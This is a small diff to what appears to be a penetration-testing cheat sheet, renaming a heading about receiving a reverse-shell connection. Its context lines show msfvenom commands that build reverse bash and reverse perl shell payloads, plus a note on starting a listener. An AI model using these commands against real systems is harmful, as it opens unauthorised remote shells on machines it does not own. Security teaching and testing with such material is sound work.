@@ -71,7 +71,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST={LHOST} LPORT={LPORT} -f raw > shell.sh
 msfvenom -p cmd/unix/reverse_perl LHOST={LHOST} LPORT={LPORT} -f raw > shell.pl
 ```
 
-## Retrieving the back connect
+## Receiving the back connect
 
 Before executing your newly created shell, make sure to run the handler so you are listening for the incoming connection.
 
